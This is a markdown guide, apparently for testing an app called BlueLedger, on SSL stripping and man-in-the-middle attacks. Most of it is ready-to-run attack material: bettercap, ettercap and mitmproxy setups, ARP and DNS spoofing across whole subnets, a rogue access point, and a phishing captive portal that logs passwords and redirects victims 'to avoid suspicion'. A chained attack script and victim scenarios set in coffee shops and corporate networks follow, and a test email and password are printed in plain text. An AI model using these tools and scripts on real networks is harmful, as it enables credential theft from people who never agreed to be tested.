# SSL/TLS Downgrade Attack Testing Guide

> **⚠️ DISCLAIMER**: This guide is for educational and authorized security testing purposes only. Only use these techniques on systems you own or have explicit permission to test.

## Overview

SSL/TLS downgrade attacks force encrypted HTTPS connections to downgrade to unencrypted HTTP, allowing attackers to intercept credentials and sensitive data in plaintext. This guide covers multiple tools and techniques for testing your BlueLedger application.

## Prerequisites

### Test Environment Setup
```bash
# Start your HTTPS-enabled application
docker-compose -f docker-compose.https.yml up

# Verify both endpoints are running
curl -k https://localhost:5443/health
curl http://localhost:5000/health
```

### Network Setup
- **Target**: localhost (127.0.0.1)
- **HTTPS Port**: 5443 
- **HTTP Port**: 5000
- **Test User**: pedermo@sinamoa.com / ChemicalReaction42!

---

## 1. Burp Suite Professional

### Setup
1. **Download & Install**: [Burp Suite Professional](https://portswigger.net/burp)
2. **Start Burp**: Launch and create temporary project
3. **Configure Proxy**: Proxy → Options → Proxy Listeners

### Attack Configuration

#### Step 1: Proxy Setup
```
Proxy Listener: 127.0.0.1:8080
```

#### Step 2: Browser Configuration
- **Firefox/Chrome**: Set proxy to 127.0.0.1:8080
- **Certificate**: Install Burp CA certificate for HTTPS interception

#### Step 3: SSL Kill Switch Extension
```burp
Extensions → BApp Store → Install "SSL Kill Switch"
```

### Execution Steps

#### Method 1: Manual Interception
1. **Intercept On**: Proxy → Intercept is on
2. **Navigate**: Go to https://localhost:5443 in browser
3. **Intercept Request**: Catch the HTTPS request
4. **Modify URL**: Change `https://` to `http://`
5. **Change Host**: localhost:5443 → localhost:5000
6. **Forward**: Send modified request

#### Method 2: Match & Replace Rules
```
Proxy → Options → Match and Replace
Add Rule:
- Type: Request header
- Match: ^Host: localhost:5443$
- Replace: Host: localhost:5000
- Comment: Downgrade HTTPS to HTTP

Add Rule:
- Type: Request first line  
- Match: https://localhost:5443
- Replace: http://localhost:5000
```

#### Method 3: Burp Extensions
```python
# Custom Burp Extension (simplified)
from burp import IBurpExtender, IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            request = messageInfo.getRequest()
            requestString = self._helpers.bytesToString(request)
            
            # Perform downgrade
            if "https://localhost:5443" in requestString:
                newRequest = requestString.replace(
                    "https://localhost:5443", 
                    "http://localhost:5000"
                )
                messageInfo.setRequest(self._helpers.stringToBytes(newRequest))
```

### Verification
- **HTTP History**: Check for HTTP requests to port 5000
- **Logger**: Verify credentials visible in plaintext
- **Target**: Confirm successful login via HTTP

---

## 2. Bettercap

### Installation
```bash
# Ubuntu/Debian
sudo apt update && sudo apt install bettercap

# Or build from source
go install github.com/bettercap/bettercap@latest
```

### Basic SSL Stripping

#### Method 1: HTTP Proxy with SSL Strip
```bash
# Start bettercap with web UI
sudo bettercap -iface lo

# In bettercap console:
> set http.proxy.sslstrip true
> set http.proxy.address 127.0.0.1
> set http.proxy.port 8080
> http.proxy on

# Configure browser proxy to 127.0.0.1:8080
# Navigate to https://localhost:5443
```

#### Method 2: Custom Caplet
Create `/tmp/ssl_downgrade.cap`:
```bash
# SSL Downgrade caplet
set http.proxy.sslstrip true
set http.proxy.address 127.0.0.1  
set http.proxy.port 8080
set http.proxy.script /tmp/downgrade.js

http.proxy on

# Keep running
sleep 1
clear
```

Create `/tmp/downgrade.js`:
```javascript
function onRequest(req, res) {
    if (req.hostname === 'localhost' && req.port === 5443) {
        // Log the original HTTPS request
        console.log('[HTTPS] Original request to:', req.url);
        
        // Modify to HTTP
        req.port = 5000;
        req.scheme = 'http';
        
        console.log('[HTTP] Downgraded to:', req.url);
    }
}

function onResponse(req, res) {
    if (req.path.includes('/auth/login')) {
        console.log('[CREDENTIALS] Login attempt intercepted');
        console.log('[BODY]', req.body);
    }
}
```

#### Execution
```bash
sudo bettercap -caplet /tmp/ssl_downgrade.cap
```

### Advanced Network-Level Attack
```bash
# For network-wide testing (if testing on network)
sudo bettercap -iface eth0

# In console:
> net.probe on
> set arp.spoof.targets 192.168.1.0/24
> set http.proxy.sslstrip true
> arp.spoof on
> http.proxy on
```

---

## 3. Ettercap

### Installation
```bash
sudo apt install ettercap-text-only ettercap-graphical
```

### Configuration

#### Filter Creation
Create `/tmp/downgrade.ecf`:
```c
if (ip.proto == TCP && tcp.dst == 5443) {
    if (search(DATA.data, "Host: localhost:5443")) {
        replace("Host: localhost:5443", "Host: localhost:5000");
        replace("https://localhost:5443", "http://localhost:5000");
        msg("[DOWNGRADE] HTTPS -> HTTP attack performed\n");
    }
}
```

Compile filter:
```bash
etterfilter /tmp/downgrade.ecf -o /tmp/downgrade.ef
```

### Execution

#### Text Mode
```bash
# Local loopback testing
sudo ettercap -T -M arp:remote /127.0.0.1// /127.0.0.1// -F /tmp/downgrade.ef
```

#### GUI Mode
```bash
sudo ettercap -G
# Configure targets and filters through GUI
```

### Advanced Plugin Usage
Create custom plugin `/tmp/ssl_strip.c`:
```c
#include <ec.h>
#include <ec_plugins.h>

static void ssl_strip_init(void) {
    USER_MSG("SSL Strip plugin loaded\n");
}

static int ssl_strip_fini(void) {
    USER_MSG("SSL Strip plugin unloaded\n");
    return PLUGIN_FINISHED;
}

// Plugin registration
struct plugin_ops ssl_strip_ops = { 
    ettercap_version: EC_VERSION,
    name: "ssl_strip",
    info: "SSL Strip downgrade attack",
    init: ssl_strip_init,
    fini: ssl_strip_fini,
};
```

---

## 4. THC-SSL-DOS / SSL Strip Tools

### SSLstrip (Classic)
```bash
# Install
git clone https://github.com/moxie0/sslstrip.git
cd sslstrip
python setup.py install

# Basic usage
echo '1' > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sslstrip -l 10000
```

### Modern SSLstrip2
```bash
git clone https://github.com/LeonardoNve/sslstrip2.git
cd sslstrip2

# Run with domain replacement
python sslstrip.py -l 8080 -w /tmp/sslstrip.log
```

### Configuration for Local Testing
```bash
# Create iptables rules for local redirect
sudo iptables -t nat -A OUTPUT -p tcp --dport 5443 -j REDIRECT --to-port 8080

# Run sslstrip  
python sslstrip.py -l 8080 -f -k

# Test - this will be redirected
curl https://localhost:5443/api/auth/login
```

---

## 5. mitmproxy

### Installation
```bash
pip install mitmproxy
```

### Basic SSL Stripping

#### Method 1: Command Line
```bash
# Start mitmproxy with SSL strip
mitmproxy --mode transparent --showhost --ssl-insecure

# In separate terminal, configure iptables
sudo iptables -t nat -A OUTPUT -p tcp --dport 5443 -j REDIRECT --to-port 8080
```

#### Method 2: Python Script
Create `/tmp/ssl_downgrade.py`:
```python
from mitmproxy import http
import logging

class SSLDowngrader:
    def request(self, flow: http.HTTPFlow) -> None:
        # Check if this is HTTPS request to our target
        if flow.request.pretty_host == "localhost" and flow.request.port == 5443:
            logging.info(f"[INTERCEPT] Original HTTPS request: {flow.request.url}")
            
            # Modify the request to go to HTTP port
            flow.request.port = 5000
            flow.request.scheme = "http"
            
            # Update Host header
            flow.request.headers["host"] = "localhost:5000"
            
            logging.info(f"[DOWNGRADE] Modified to HTTP: {flow.request.url}")
    
    def response(self, flow: http.HTTPFlow) -> None:
        # Log any authentication attempts
        if "/auth/login" in flow.request.path:
            if flow.request.method == "POST":
                body = flow.request.get_text()
                if "password" in body.lower():
                    logging.warning(f"[CREDENTIALS] Captured login attempt: {body}")

addons = [SSLDowngrader()]
```

Run the script:
```bash
mitmdump -s /tmp/ssl_downgrade.py --set confdir=/tmp
```

### Advanced mitmproxy Configuration

#### Interactive Mode
```bash
mitmproxy --set confdir=/tmp --ssl-insecure
```

Key commands in mitmproxy:
- `i` - Intercept requests
- `e` - Edit request/response  
- `r` - Replay request
- `f` - Set filter expressions

#### Web Interface
```bash
mitmweb --web-host 127.0.0.1 --web-port 8081
```
Access at: http://127.0.0.1:8081

---

## 6. Network-Level MITM Attacks Against Other Devices

> **⚠️ CRITICAL**: These techniques should ONLY be used on networks you own or have explicit written authorization to test. Unauthorized interception of network traffic is illegal in most jurisdictions.

### Network Reconnaissance

#### Step 1: Network Discovery
```bash
# Discover network range
ip route | grep -E "192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\."

# Scan for active hosts
nmap -sn 192.168.1.0/24

# Identify target devices
nmap -sS -O 192.168.1.0/24 | grep -A 5 "Nmap scan report"
```

#### Step 2: Target Analysis
```bash
# Check if target is accessing our application
nmap -p 80,443,5000,5443 192.168.1.100

# Monitor network traffic to identify web usage
tcpdump -i eth0 host 192.168.1.100 and port 80 or port 443
```

### ARP Spoofing Attacks

#### Method 1: Bettercap Network MITM

##### Setup Network Attack
```bash
# Start bettercap with network interface
sudo bettercap -iface eth0

# In bettercap console - discover network
> net.probe on

# Identify targets (wait 30 seconds for discovery)
> net.show

# Set target range or specific hosts
> set arp.spoof.targets 192.168.1.100,192.168.1.101
> set arp.spoof.fullduplex true
> set arp.spoof.internal true

# Enable ARP spoofing
> arp.spoof on
```

##### SSL Strip Network Attack
```bash
# Configure HTTP proxy with SSL strip
> set http.proxy.sslstrip true
> set http.proxy.address 192.168.1.50  # Your IP
> set http.proxy.port 8080
> http.proxy on

# Monitor captured credentials
> set http.proxy.script /tmp/credential_logger.js
```

##### Advanced Bettercap Caplet
Create `/tmp/network_mitm.cap`:
```bash
# Network MITM with SSL Strip
set net.probe.timeout 3
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.fullduplex true

# Enable modules
net.probe on
arp.spoof on

# HTTP proxy configuration
set http.proxy.sslstrip true
set http.proxy.address 0.0.0.0
set http.proxy.port 8080
set http.proxy.script /tmp/blueledger_interceptor.js
http.proxy on

# HTTPS proxy for certificate replacement
set https.proxy.address 0.0.0.0
set https.proxy.port 8443
set https.proxy.certificate /tmp/fake_cert.pem
set https.proxy.key /tmp/fake_key.pem
https.proxy on

# Keep running
sleep 1
clear
```

##### Credential Interception Script
Create `/tmp/blueledger_interceptor.js`:
```javascript
function onRequest(req, res) {
    // Log all requests to our target application
    if (req.hostname.includes('blueledger') || req.port == 5000 || req.port == 5443) {
        console.log('[TARGET] Request to BlueLedger app:', req.url);
        
        // Force downgrade to HTTP
        if (req.scheme === 'https') {
            console.log('[DOWNGRADE] HTTPS -> HTTP attack');
            req.scheme = 'http';
            req.port = 5000;
        }
    }
}

function onResponse(req, res) {
    // Capture login attempts
    if (req.path.includes('/auth/login') && req.method === 'POST') {
        console.log('\n=== CREDENTIAL CAPTURE ===');
        console.log('Target Device:', req.client.ip);
        console.log('User-Agent:', req.headers['User-Agent']);
        console.log('Login Data:', req.body);
        console.log('Timestamp:', new Date().toISOString());
        console.log('========================\n');
        
        // Log to file
        var fs = require('fs');
        var logEntry = {
            timestamp: new Date().toISOString(),
            client_ip: req.client.ip,
            user_agent: req.headers['User-Agent'],
            credentials: req.body,
            url: req.url
        };
        fs.appendFileSync('/tmp/captured_credentials.log', JSON.stringify(logEntry) + '\n');
    }
}
```

#### Method 2: Ettercap Network MITM

##### Basic Network Poisoning
```bash
# Scan network for hosts
sudo ettercap -T -M arp:remote /192.168.1.0/24//

# Target specific devices
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
```

##### Advanced Ettercap with Filters
Create `/tmp/network_downgrade.ecf`:
```c
if (ip.proto == TCP && tcp.dst == 443 || tcp.dst == 5443) {
    if (search(DATA.data, "Host:")) {
        log(DATA.data, "/tmp/https_requests.log");
        msg("[HTTPS] Intercepted HTTPS request from %s\n", ip.src);
        
        # Replace HTTPS references with HTTP
        if (search(DATA.data, "https://")) {
            replace("https://", "http://");
            replace(":5443", ":5000");
            replace(":443", ":80");
            msg("[DOWNGRADE] Performed SSL strip attack\n");
        }
    }
}

if (ip.proto == TCP && tcp.dst == 80 || tcp.dst == 5000) {
    if (search(DATA.data, "password") && search(DATA.data, "POST")) {
        log(DATA.data, "/tmp/captured_passwords.log");
        msg("[CAPTURE] Password captured from %s\n", ip.src);
    }
}
```

Compile and execute:
```bash
etterfilter /tmp/network_downgrade.ecf -o /tmp/network_downgrade.ef
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.0/24// -F /tmp/network_downgrade.ef
```

### DNS Spoofing Attacks

#### Method 1: Bettercap DNS Spoofing

##### DNS Redirection Setup
```bash
sudo bettercap -iface eth0

# In bettercap console:
> set dns.spoof.domains blueledger.local,*.blueledger.local
> set dns.spoof.address 192.168.1.50  # Your malicious server IP
> dns.spoof on

# Combined with ARP spoofing
> set arp.spoof.targets 192.168.1.0/24
> arp.spoof on
```

##### Malicious Server Setup
```bash
# Set up fake BlueLedger server on your machine
# Copy the application but modify it to log credentials

# Create nginx config to serve fake site
cat > /tmp/fake_blueledger.conf << 'EOF'
server {
    listen 80;
    listen 5000;
    server_name blueledger.local *.blueledger.local;
    
    location / {
        proxy_pass http://localhost:9000;  # Your fake server
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        
        # Log all requests
        access_log /tmp/fake_access.log;
    }
}
EOF

sudo nginx -c /tmp/fake_blueledger.conf
```

#### Method 2: Ettercap DNS Spoofing

##### DNS Configuration
```bash
# Create DNS hosts file
cat > /tmp/etter.dns << 'EOF'
blueledger.local      A   192.168.1.50
*.blueledger.local    A   192.168.1.50
localhost             A   192.168.1.50
EOF

# Run ettercap with DNS spoofing
sudo ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.0/24//
```

### WiFi-Based Attacks

#### Method 1: Fake Access Point

##### Setup Rogue AP
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Create AP configuration
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=Corporate_WiFi_Guest
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# DHCP configuration
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.100.10,192.168.100.50,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
log-dhcp
address=/blueledger.local/192.168.100.1
address=/#/192.168.100.1
EOF
```

##### Launch Attack
```bash
# Set up network interface
sudo ip link set dev wlan1 up
sudo ip addr add 192.168.100.1/24 dev wlan1

# Start services
sudo hostapd /tmp/hostapd.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf &

# Enable IP forwarding and NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT

# Start credential capture server
python3 scripts/fake_blueledger_server.py
```

#### Method 2: Captive Portal Attack

##### Portal Setup
Create `/tmp/captive_portal.py`:
```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from urllib.parse import urlparse, parse_qs

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve fake BlueLedger login page
        if self.path == '/' or 'blueledger' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            fake_login_page = """
            <!DOCTYPE html>
            <html>
            <head><title>BlueLedger - Login</title></head>
            <body>
                <h2>BlueLedger Corporate Portal</h2>
                <form method="POST" action="/auth/login">
                    <input type="email" name="email" placeholder="Email" required><br><br>
                    <input type="password" name="password" placeholder="Password" required><br><br>
                    <input type="submit" value="Login">
                </form>
            </body>
            </html>
            """
            self.wfile.write(fake_login_page.encode())
    
    def do_POST(self):
        if '/auth/login' in self.path:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            
            # Log captured credentials
            print(f"\n=== CREDENTIAL CAPTURE ===")
            print(f"Client IP: {self.client_address[0]}")
            print(f"Data: {post_data}")
            print(f"User-Agent: {self.headers.get('User-Agent', 'Unknown')}")
            
            # Save to file
            with open('/tmp/captive_portal_captures.log', 'a') as f:
                f.write(f"{self.client_address[0]}: {post_data}\n")
            
            # Redirect to real site to avoid suspicion
            self.send_response(302)
            self.send_header('Location', 'http://google.com')
            self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 80), CaptivePortalHandler)
    print("Captive portal running on port 80...")
    server.serve_forever()
```

### Advanced Network Attack Combinations

#### Full Network Compromise Chain
Create `/tmp/full_network_attack.sh`:
```bash
#!/bin/bash

echo "Full Network MITM Attack Chain"
echo "=============================="

# Step 1: Network discovery
echo "[1] Discovering network targets..."
nmap -sn 192.168.1.0/24 | grep -o "192.168.1.[0-9]*" > /tmp/targets.txt
echo "Found $(wc -l < /tmp/targets.txt) potential targets"

# Step 2: Start credential capture server
echo "[2] Starting credential capture server..."
python3 /tmp/captive_portal.py &
PORTAL_PID=$!

# Step 3: DNS spoofing setup
echo "[3] Setting up DNS spoofing..."
cat > /tmp/etter.dns << 'EOF'
*.blueledger.com    A   192.168.1.50
blueledger.local    A   192.168.1.50  
localhost           A   192.168.1.50
EOF

# Step 4: Launch coordinated attack
echo "[4] Launching ARP + DNS spoofing attack..."
sudo ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.0/24// &
ETTERCAP_PID=$!

# Step 5: SSL Strip with bettercap
echo "[5] Starting SSL strip attack..."
sudo bettercap -caplet /tmp/network_mitm.cap &
BETTERCAP_PID=$!

echo "[ATTACK ACTIVE] Press Ctrl+C to stop..."
trap "kill $PORTAL_PID $ETTERCAP_PID $BETTERCAP_PID 2>/dev/null; exit" INT

# Monitor captured data
tail -f /tmp/captured_credentials.log /tmp/captive_portal_captures.log
```

### 7. Complete Attack Chain

#### Step 1: Network Preparation
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up traffic redirection  
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 5443 -j REDIRECT --to-port 8080
```

#### Step 2: Tool Selection
Choose your preferred tool and run it:

```bash
# Option A: Bettercap
sudo bettercap -caplet ssl_strip.cap

# Option B: mitmproxy  
mitmdump -s ssl_downgrade.py

# Option C: Custom Python proxy
python3 scripts/ssl_strip_demo.py
```

#### Step 3: Testing
```bash
# Test the attack
curl -L -v https://localhost:5443/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email":"pedermo@sinamoa.com","password":"ChemicalReaction42!"}'
```

### Verification Checklist

✅ **Attack Successful If**:
- Traffic flows through proxy (port 8080)
- HTTPS requests become HTTP requests  
- Credentials visible in plaintext logs
- Login still succeeds (indicating successful downgrade)

❌ **Attack Failed If**:
- Certificate errors prevent connection
- HTTPS requests remain encrypted
- No traffic captured by proxy
- Application implements HSTS properly

---

## Defense Mechanisms to Test

### 1. HTTP Strict Transport Security (HSTS)
Add to your backend response headers:
```javascript
res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
```

### 2. Certificate Pinning
```javascript
// In frontend code
if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
    location.replace('https:' + window.location.href.substring(window.location.protocol.length));
}
```

### 3. Secure Cookie Flags
```javascript
res.cookie('token', token, {
    httpOnly: true,
    secure: true, // HTTPS only
    sameSite: 'strict'
});
```

---

## Troubleshooting

### Common Issues

#### Certificate Errors
```bash
# Add --insecure flag for testing
curl -k https://localhost:5443/api/auth/login

# Or install custom CA certificate
```

#### Port Binding Issues
```bash
# Check what's using the ports
netstat -tulpn | grep :8080
sudo lsof -i :8080

# Kill conflicting processes
sudo pkill -f "port 8080"
```

#### iptables Rules
```bash
# List current rules
iptables -t nat -L

# Clear all rules (CAREFUL!)
iptables -t nat -F

# Remove specific rule
iptables -t nat -D OUTPUT -p tcp --dport 5443 -j REDIRECT --to-port 8080
```

---

## Automated Testing Script

Create `/tmp/automated_downgrade_test.sh`:
```bash
#!/bin/bash

echo "Automated SSL Downgrade Testing"
echo "==============================="

# Test 1: Direct HTTP vs HTTPS comparison
echo "Test 1: Comparing HTTP vs HTTPS responses..."
http_response=$(curl -s http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"pedermo@sinamoa.com","password":"ChemicalReaction42!"}')

https_response=$(curl -s -k https://localhost:5443/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"pedermo@sinamoa.com","password":"ChemicalReaction42!"}')

echo "HTTP Response: $http_response"
echo "HTTPS Response: $https_response"

# Test 2: Proxy-based attack simulation
echo -e "\nTest 2: Starting proxy attack..."
python3 scripts/ssl_strip_demo.py &
PROXY_PID=$!

sleep 2

# Configure proxy and test
export http_proxy=http://localhost:8080
export https_proxy=http://localhost:8080

attack_response=$(curl -s --proxy localhost:8080 https://localhost:5443/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"pedermo@sinamoa.com","password":"ChemicalReaction42!"}')

echo "Attack Response: $attack_response"

# Cleanup
kill $PROXY_PID 2>/dev/null
unset http_proxy https_proxy

echo -e "\nTesting completed!"
```

---

## Legal and Ethical Considerations

⚖️ **Important Reminders**:
- Only test systems you own or have written authorization to test
- Document all testing activities
- Follow responsible disclosure if vulnerabilities are found
- Respect local laws and regulations regarding security testing
- Consider the impact on network performance during testing

---

## Network Attack Quick Reference

### 🚀 Quick Start Commands

#### Network Discovery
```bash
# Basic network scan
sudo ./scripts/network_mitm_attack.sh eth0

# Manual network discovery
nmap -sn 192.168.1.0/24
nmap -p 80,443,5000,5443 192.168.1.0/24
```

#### ARP Spoofing Attack
```bash
# Automated ARP spoofing with bettercap
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.0/24
> set http.proxy.sslstrip true
> arp.spoof on
> http.proxy on
```

#### DNS Spoofing Attack
```bash
# Setup fake server
python3 scripts/captive_portal.py --port 80 &

# DNS spoofing with ettercap
echo "localhost A 192.168.1.50" > /tmp/etter.dns
sudo ettercap -T -M arp:remote -P dns_spoof /gateway/ /targets/
```

#### WiFi Captive Portal
```bash
# Create rogue AP
sudo python3 scripts/captive_portal.py --port 80 --https-port 443 \
     --ssl-cert certs/cert.pem --ssl-key certs/key.pem
```

### 📊 Monitoring & Logs

All network attacks log to these files:
- `/tmp/intercepted_credentials.log` - ARP spoofing captures
- `/tmp/captive_portal_captures.log` - WiFi/DNS captures  
- `/tmp/dns_spoof_captures.log` - DNS redirection logs

### 🛡️ Detection & Prevention

#### Network-Level Defenses
```bash
# Enable HSTS in your application
res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

# Certificate pinning
const expectedFingerprint = 'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';
if (serverFingerprint !== expectedFingerprint) {
    throw new Error('Certificate pinning violation');
}

# Detect ARP spoofing
arp -a | grep -E "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}" | sort | uniq -d
```

#### Application-Level Defenses
```javascript
// Force HTTPS redirect
app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
        res.redirect(`https://${req.header('host')}${req.url}`);
    } else {
        next();
    }
});

// Secure cookies
app.use(session({
    cookie: {
        secure: true,      // HTTPS only
        httpOnly: true,    // No JavaScript access
        sameSite: 'strict' // CSRF protection
    }
}));
```

### 🔍 Advanced Scenarios

#### Corporate Network Testing
```bash
# Multi-vector attack
sudo ./scripts/network_mitm_attack.sh eth0
# Select option 5 for full attack scenario

# Monitor specific targets
tcpdump -i eth0 host 192.168.1.100 and port 5000
```

#### Mobile Device Testing
```bash
# Create convincing corporate WiFi
sudo python3 scripts/captive_portal.py --port 80 \
     --interface 0.0.0.0

# Setup fake AP with corporate naming
echo "ssid=CompanyName-Guest" >> /tmp/hostapd.conf
```

### 📈 Attack Success Metrics

#### Indicators of Successful Attack:
- ✅ Target devices connect to fake AP/redirect to fake site
- ✅ Credentials captured in log files  
- ✅ Traffic flows through attacker machine
- ✅ HTTPS successfully downgraded to HTTP
- ✅ No certificate warnings displayed to user

#### Indicators of Failed Attack:
- ❌ Certificate pinning blocks connection
- ❌ HSTS forces HTTPS redirect
- ❌ No traffic captured in logs
- ❌ Target detects ARP spoofing
- ❌ Application shows security warnings

---

## Real-World Attack Scenarios

### Scenario 1: Coffee Shop Attack
**Setup**: Attacker creates fake "CoffeeShop_WiFi" AP
**Target**: Employees accessing corporate BlueLedger portal
**Method**: Captive portal + DNS spoofing
```bash
python3 scripts/captive_portal.py --port 80
# Victims see realistic BlueLedger login page
```

### Scenario 2: Corporate Network Compromise  
**Setup**: Attacker gains network access via physical/WiFi
**Target**: All devices on corporate LAN
**Method**: ARP spoofing + SSL stripping
```bash
sudo bettercap -iface eth0 -caplet network_mitm.cap
# Intercepts ALL BlueLedger traffic on network
```

### Scenario 3: Targeted Device Attack
**Setup**: Attacker knows target device IP
**Target**: Specific high-value employee device
**Method**: Focused ARP spoofing + credential capture
```bash
# Target specific device
ettercap -T -M arp:remote /gateway/ /192.168.1.100/
```

---

This comprehensive guide provides multiple approaches to test SSL/TLS downgrade vulnerabilities and network-level man-in-the-middle attacks against your BlueLedger application for educational and security assessment purposes.